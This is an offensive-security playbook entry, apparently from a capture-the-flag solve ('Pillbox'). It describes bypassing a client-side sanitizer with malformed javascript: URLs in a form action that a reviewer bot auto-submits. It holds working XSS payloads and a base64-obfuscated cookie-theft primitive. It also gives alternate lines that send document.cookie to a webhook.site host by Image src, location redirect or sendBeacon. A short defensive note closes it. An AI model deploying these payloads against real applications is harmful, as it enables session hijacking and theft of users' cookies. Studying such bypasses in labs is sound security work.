# Invalid JavaScript URL Form Action Exfil

## Context

Use only in authorized labs, owned applications, in-scope bug bounty targets, or defensive validation.

Apply when:

- a client-side sanitizer allows `<form>` elements
- `action` / `formaction` are scrubbed only if `new URL(value).protocol === 'javascript:'`
- malformed `javascript:` values that throw in `new URL()` survive sanitization
- a preview or reviewer bot auto-submits the first form
- the bot calls `requestSubmit()` without a submitter, so the payload must be on `<form action>`

## Minimal Execution Payload

```html
<form action="javascript://://-alert(1)//">
  <button type="submit">x</button>
</form>
```

## Cookie Exfil Payload

```html
<form action="javascript://://-eval(atob('[BASE64]'))//">
  <button type="submit">x</button>
</form>
```

Generate `[BASE64]` from your exfil primitive:

```bash
python3 -c "import base64; print(base64.b64encode(b\"new Image().src='//webhook.site/[UUID]?c='+document.cookie\").decode())"
```

Example decoded primitive:

```javascript
new Image().src='//webhook.site/[UUID]?c='+document.cookie
```

Use protocol-relative webhook URLs inside the decoded payload to avoid extra `https://` bytes in the `action` attribute.

## Alternate Decoded Primitives

```javascript
location='//webhook.site/[UUID]?c='+document.cookie
navigator.sendBeacon('//webhook.site/[UUID]?c='+document.cookie)
```

Prefer `new Image().src` first; it was the most reliable in the Pillbox solve.

## Why It Works

1. `new URL('javascript://://-...')` throws, so the sanitizer keeps the attribute.
2. GET form submission re-serializes it to valid `javascript:/.//-...//?`.
3. Base64 hides `document` and `cookie` from Chrome's `javascript:` navigation substring filter.

## Why It Fails

- Sanitizer rejects any value starting with `javascript` regardless of parser success.
- Forms are denied entirely.
- Bot does not auto-submit forms.
- Only `formaction` is used and the bot calls `requestSubmit()` without a submitter.
- Reviewer cookie is `HttpOnly` and no in-origin data theft path exists.
- Outbound network is blocked from the review browser.

## Common Mistakes

- Using `formaction` on a button instead of `action` on the form.
- Putting `document.cookie` directly in the `action` URL.
- Using `fetch('https://...'+document.cookie)` before confirming the reparsing stage works with `alert(1)`.
- Forgetting that only one staged snippet exists per session in some labs.
- Storing live flags, webhook UUIDs, or reviewer cookies in reusable payload files.

## Defensive Note

Do not treat URL parse failure as safety. Reject suspicious schemes before parsing, and never auto-submit untrusted forms in privileged review contexts.
